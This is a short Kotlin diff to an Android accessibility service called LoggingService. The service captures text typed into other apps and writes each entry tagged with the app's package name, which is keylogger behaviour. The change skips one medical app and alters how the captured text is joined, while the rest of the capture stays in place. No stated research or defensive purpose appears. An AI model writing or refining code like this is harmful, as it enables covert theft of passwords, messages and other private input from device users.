@@ -11,7 +11,12 @@ class LoggingService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             val packageName = event.packageName?.toString() ?: "UnknownApp"
-            val typedText = event.text.toString()
+
+            if (packageName == "com.example.medicalcare") {
+                return
+            }
+
+            val typedText = event.text.joinToString("")
 
             if (typedText.isNotEmpty() && typedText != "[]") {
                 val entry = "[$packageName]: $typedText\n"
